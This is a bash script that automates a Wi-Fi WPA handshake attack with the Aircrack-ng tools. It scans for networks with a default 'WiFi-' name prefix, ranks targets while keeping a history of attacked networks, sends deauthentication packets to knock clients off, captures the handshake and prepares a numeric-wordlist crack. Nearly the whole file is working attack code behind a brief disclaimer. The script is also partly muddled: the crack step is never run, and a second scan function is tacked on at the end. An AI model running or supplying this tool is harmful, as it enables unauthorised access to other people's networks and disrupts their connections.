#!/usr/bin/env bash
#
# DISCLAIMER:
# This script is for educational demonstration only.
# Use only in a controlled lab environment with permission.
# Do NOT use on unauthorized networks.
#
# What this script does:
# 1. Enables monitor mode on a specified interface.
# 2. Scans for target networks with a known SSID pattern.
# 3. Focuses on one target network, capturing handshakes.
# 4. Sends deauth packets to force clients to reauthenticate.
# 5. Attempts to crack the handshake using a numeric-only wordlist.

##############################################
# USER-ADJUSTABLE PARAMETERS
##############################################

IFACE="wlan1"              # Set to your wireless interface name before monitor mode
MON_IFACE="${IFACE}mon"    # This will be created by airmon-ng start <IFACE>
TARGET_SSID_PREFIX="WiFi-" # Adjust if your target networks have a different known prefix
WORDLIST="8digit.lst"      # Path to the numeric wordlist (must exist)
CAPTURE_DIR="./captures"   # Directory to store captures
ETH_IFACE="eth0"          # Ethernet interface name - adjust if different
HISTORY_FILE="attack_history.txt"  # File to store attack history

##############################################

# Check for root privileges
if [ "$(id -u)" != "0" ]; then
    echo "[!] This script must be run as root"
    exit 1
fi

# Create history file if it doesn't exist
touch "$HISTORY_FILE"

# Function to check if network was previously attacked
check_network_history() {
    local bssid=$1
    local last_attempt=$(grep "^$bssid," "$HISTORY_FILE" | tail -n 1)
    if [ ! -z "$last_attempt" ]; then
        echo "$last_attempt"
        return 0
    fi
    return 1
}

# Function to add network to history
add_to_history() {
    local bssid=$1
    local essid=$2
    local result=$3
    echo "$bssid,$essid,$(date '+%Y-%m-%d %H:%M:%S'),$result" >> "$HISTORY_FILE"
}

# Function to display network selection menu
select_target_network() {
    local scan_file=$1
    local networks=()
    local i=1
    
    echo
    echo "Available networks matching prefix '$TARGET_SSID_PREFIX':"
    echo "--------------------------------------------------------"
    echo "ID  ESSID            Channel  Signal  Clients  History"
    echo "--------------------------------------------------------"
    
    while IFS=, read -r bssid first_time pwr beacons data iv channel essid; do
        # Skip header and empty lines
        if [[ "$bssid" =~ ^[[:space:]]*$ ]] || [[ "$bssid" == "BSSID" ]] || [[ "$bssid" =~ "Station MAC" ]]; then
            continue
        fi
        
        # Only process lines with our target prefix
        if [[ "$essid" == *"$TARGET_SSID_PREFIX"* ]]; then
            # Clean up ESSID
            essid=$(echo "$essid" | tr -d '"' | tr -d ' ')
            
            # Get client count
            client_count=$(grep -c "$bssid" "$scan_file")
            
            # Check history
            history_msg="Never attacked"
            if history_line=$(check_network_history "$bssid"); then
                last_date=$(echo "$history_line" | cut -d',' -f3)
                last_result=$(echo "$history_line" | cut -d',' -f4)
                history_msg="Last: $last_date ($last_result)"
            fi
            
            # Calculate recommendation score (higher is better)
            score=0
            # Stronger signal (lower PWR is better, PWR is negative)
            # Convert PWR to positive number first
            pwr_num=$(echo "$pwr" | tr -d '-')
            if [[ "$pwr_num" =~ ^[0-9]+$ ]]; then
                score=$((score + pwr_num))
            fi
            
            # More clients is better
            if [[ "$client_count" =~ ^[0-9]+$ ]]; then
                score=$((score + client_count * 10))
            fi
            
            # Prefer networks we haven't tried
            if [ "$history_msg" == "Never attacked" ]; then
                score=$((score + 50))
            elif [[ "$history_msg" == *"failed"* ]]; then
                score=$((score - 30))
            fi
            
            networks+=("$bssid,$essid,$channel,$pwr,$client_count,$history_msg,$score")
            
            printf "%2d) %-15s %7s %7s %8s  %s\n" $i "$essid" "$channel" "${pwr}dB" "$client_count" "$history_msg"
            ((i++))
        fi
    done < "$scan_file"
    
    # Sort networks by score and show recommendation
    echo
    echo "Recommendation based on signal strength, client count, and history:"
    best_network=$(printf '%s\n' "${networks[@]}" | sort -t',' -k7 -nr | head -n1)
    if [ ! -z "$best_network" ]; then
        IFS=',' read -r bssid essid channel pwr clients history score <<< "$best_network"
        echo "→ $essid (Channel: $channel, Signal: ${pwr}dB, Clients: $clients)"
        echo "  Reason: Strong signal, active clients, and attack history considered"
    fi
    
    # Get user selection
    echo
    read -p "Select network ID to attack (1-$((i-1))) or 'q' to quit: " choice
    
    if [[ "$choice" == "q" ]]; then
        cleanup
    fi
    
    if ! [[ "$choice" =~ ^[0-9]+$ ]] || [ "$choice" -lt 1 ] || [ "$choice" -ge "$i" ]; then
        echo "[!] Invalid selection"
        cleanup
    fi
    
    # Return the selected network details
    echo "${networks[$((choice-1))]}"
}

# Safety checks for remote connection
check_ethernet() {
    # Check if ethernet interface exists and is connected
    if ! ip link show $ETH_IFACE &>/dev/null; then
        echo "[!] Ethernet interface $ETH_IFACE not found!"
        exit 1
    fi

    # Check if interface is up and has an IP
    if ! ip addr show $ETH_IFACE | grep -q "inet "; then
        echo "[!] No IP address on $ETH_IFACE. Ensure ethernet is connected!"
        exit 1
    fi

    # Check if default route is through ethernet
    if ! ip route | grep "default" | grep -q "$ETH_IFACE"; then
        echo "[!] Warning: Default route is not through ethernet!"
        read -p "Are you sure you want to continue? (y/N) " -n 1 -r
        echo
        if [[ ! $REPLY =~ ^[Yy]$ ]]; then
            exit 1
        fi
    fi
}

# Check SSH connection
check_ssh() {
    if [ -z "$SSH_CLIENT" ] && [ -z "$SSH_TTY" ]; then
        echo "[!] Not running over SSH - safety checks skipped"
        return 0
    fi

    # Get SSH connection details
    SSH_IP=$(echo "$SSH_CLIENT" | awk '{print $1}')
    
    echo "[*] SSH client IP: $SSH_IP"
    echo "[*] SSH connection route:"
    ip route get "$SSH_IP"
    
    # Check if SSH is running over wireless interface
    if ip route get "$SSH_IP" | grep -q "$IFACE"; then
        echo "[!] WARNING: SSH appears to be running over wireless interface ($IFACE)!"
        echo "[!] Continuing could disconnect your SSH session."
        read -p "Are you sure you want to continue? This is DANGEROUS! (y/N) " -n 1 -r
        echo
        if [[ ! $REPLY =~ ^[Yy]$ ]]; then
            exit 1
        fi
        echo "[!] Proceeding at your own risk..."
    else
        echo "[*] SSH appears to be running over a different interface than $IFACE (good!)"
    fi
}

# Perform safety checks
echo "[*] Performing safety checks..."
check_ethernet
check_ssh

# Ensure capture directory exists
mkdir -p "$CAPTURE_DIR"

# Redirect all output to a log file
exec > >(tee -i script.log)
exec 2>&1

# Check for required tools
for cmd in airmon-ng airodump-ng aireplay-ng aircrack-ng; do
    if ! command -v $cmd &>/dev/null; then
        echo "[!] Missing required tool: $cmd. Please install Aircrack-ng suite."
        exit 1
    fi
done

# Function to clean up (stop monitor mode) on exit
cleanup() {
    echo "[*] Cleaning up: stopping monitor mode."
    sudo airmon-ng stop $MON_IFACE
    exit
}
trap cleanup INT TERM ERR

# Check for conflicting processes
echo "[*] Checking for conflicting processes..."
CONFLICTS=$(sudo airmon-ng check | grep "PID" -A 100 | grep -v "PID" | awk '{print $2}')
if [ ! -z "$CONFLICTS" ]; then
    echo "[!] Warning: Found conflicting processes that may prevent monitor mode from working properly."
    echo "    Conflicting processes: NetworkManager, wpa_supplicant, avahi-daemon"
    read -p "Would you like to kill these processes? (y/N) " -n 1 -r
    echo
    if [[ $REPLY =~ ^[Yy]$ ]]; then
        sudo airmon-ng check kill
    else
        echo "    Continuing without killing processes - monitor mode might fail"
    fi
fi

# Start monitor mode and get the monitor interface name
echo "[*] Enabling monitor mode..."
sudo airmon-ng start $IFACE || { echo "[!] Failed to start monitor mode"; exit 1; }

# Get the actual monitor interface name (might still be wlan1 or could be wlan1mon)
MON_IFACE=$(iwconfig 2>/dev/null | grep "Mode:Monitor" | awk '{print $1}')
if [ -z "$MON_IFACE" ]; then
    echo "[!] Could not find monitor interface"
    exit 1
fi
echo "[+] Monitor interface: $MON_IFACE"

# Update the IFACE variable to use the correct monitor interface
IFACE=$MON_IFACE

# Scan for target networks
echo "[*] Scanning for target networks (60 second scan)..."
# Remove the timeout and show output directly
sudo airodump-ng $MON_IFACE --write scan --write-interval 1 --output-format csv &
SCAN_PID=$!

# Let it run for 60 seconds
echo "[*] Scanning will run for 60 seconds. Press Ctrl+C to stop early."
sleep 60

# Kill the scan process
kill $SCAN_PID 2>/dev/null
wait $SCAN_PID 2>/dev/null

# Show found networks
if [ -f scan-01.csv ]; then
    echo -e "\nFound Networks:"
    echo "----------------------------------------"
    echo "BSSID              Channel  Power  ESSID"
    echo "----------------------------------------"
    grep -v "^BSSID\|^Station\|^$" scan-01.csv | cut -d',' -f1,4,6,14 | tr ',' ' ' | sort -k3n
    echo "----------------------------------------"
fi

# Retry scan if no results are found
if [ ! -f scan-01.csv ] || ! grep -q "$TARGET_SSID_PREFIX" scan-01.csv; then
    echo "[!] No target networks found. Retrying scan with increased timeout..."
    sudo timeout 30 airodump-ng $MON_IFACE --write scan --write-interval 1 --output-format csv > /dev/null 2>&1
    if [ ! -f scan-01.csv ] || ! grep -q "$TARGET_SSID_PREFIX" scan-01.csv; then
        echo "[!] No target networks found after retrying. Exiting."
        cleanup
    fi
fi

# After scan completion, show menu and get selection
NETWORK_CHOICE=$(select_target_network "scan-01.csv")
if [ -z "$NETWORK_CHOICE" ]; then
    echo "[!] No network selected"
    cleanup
fi

# Parse selected network details
BSSID=$(echo "$NETWORK_CHOICE" | cut -d',' -f1)
ESSID=$(echo "$NETWORK_CHOICE" | cut -d',' -f2)
CHANNEL=$(echo "$NETWORK_CHOICE" | cut -d',' -f3)

echo "[*] Selected target: ESSID=$ESSID, BSSID=$BSSID, Channel=$CHANNEL"

# Start capturing handshakes
CAP_FILE="$CAPTURE_DIR/${ESSID}_capture"
echo "[*] Starting airodump-ng on the target network to capture handshake..."
sudo airodump-ng --bssid $BSSID --channel $CHANNEL --write $CAP_FILE --write-interval 1 --output-format cap,csv $MON_IFACE &
AIRODUMP_PID=$!

sleep 5 # Allow time for airodump-ng to start

# Send deauth packets
echo "[*] Sending deauth packets to force handshake capture..."
if ! sudo aireplay-ng --deauth 20 -a $BSSID $MON_IFACE; then
    echo "[!] Warning: Failed to send deauth packets. Capture may not contain a handshake."
fi

# Wait for handshake capture
echo "[*] Waiting for handshake capture (15 seconds)..."
for i in {1..15}; do
    sleep 1
    echo -n "."
done
echo

# Stop airodump-ng
sudo kill $AIRODUMP_PID
wait $AIRODUMP_PID 2>/dev/null

# Validate handshake capture
if ! aircrack-ng "${CAP_FILE}-01.cap" | grep -q "handshake"; then
    echo "[!] No WPA handshake detected in ${CAP_FILE}-01.cap. Review the file manually if needed."
    cleanup
fi

echo "[*] Handshake captured in ${CAP_FILE}-01.cap."

# Attempt to crack the handshake
if [ ! -f "$WORDLIST" ]; then
    read -p "[!] Wordlist not found. Please provide the full path to a valid wordlist: " WORDLIST
    if [ ! -f "$WORDLIST" ]; then
        echo "[!] Invalid wordlist. Exiting."
        cleanup
    fi
fi

# Function to scan and list WiFi networks
scan_wifi_networks() {
    echo "[*] Scanning for WiFi networks..."
    # Scan for 10 seconds and grep for networks starting with WiFi
    sudo airodump-ng "$IFACE" --output-format csv -w /tmp/wifi_scan --write-interval 1 >/dev/null 2>&1 &
    sleep 10
    kill $!

    # Process the CSV file and filter networks starting with WiFi
    NETWORKS=($(cat /tmp/wifi_scan-01.csv | grep "WiFi" | awk -F ',' '{print $14}' | sed 's/^ //g' | sort -u))
    
    if [ ${#NETWORKS[@]} -eq 0 ]; then
        echo "[!] No networks found starting with 'WiFi'"
        exit 1
    fi

    # Display networks with numbers
    echo "[*] Available WiFi networks:"
    for i in "${!NETWORKS[@]}"; do
        echo "    $((i+1)). ${NETWORKS[$i]}"
    done

    # Get user selection
    while true; do
        read -p "[?] Select network number (1-${#NETWORKS[@]}): " selection
        if [[ "$selection" =~ ^[0-9]+$ ]] && [ "$selection" -ge 1 ] && [ "$selection" -le "${#NETWORKS[@]}" ]; then
            TARGET_NETWORK="${NETWORKS[$((selection-1))]}"
            TARGET_BSSID=$(cat /tmp/wifi_scan-01.csv | grep "$TARGET_NETWORK" | head -1 | awk -F ',' '{print $1}')
            TARGET_CHANNEL=$(cat /tmp/wifi_scan-01.csv | grep "$TARGET_NETWORK" | head -1 | awk -F ',' '{print $4}' | tr -d ' ')
            break
        else
            echo "[!] Invalid selection. Please try again."
        fi
    done

    # Cleanup temporary files
    rm -f /tmp/wifi_scan-01.csv

    echo "[+] Selected network: $TARGET_NETWORK"
    echo "[+] BSSID: $TARGET_BSSID"
    echo "[+] Channel: $TARGET_CHANNEL"
}

# Add this after setting up monitor mode
scan_wifi_networks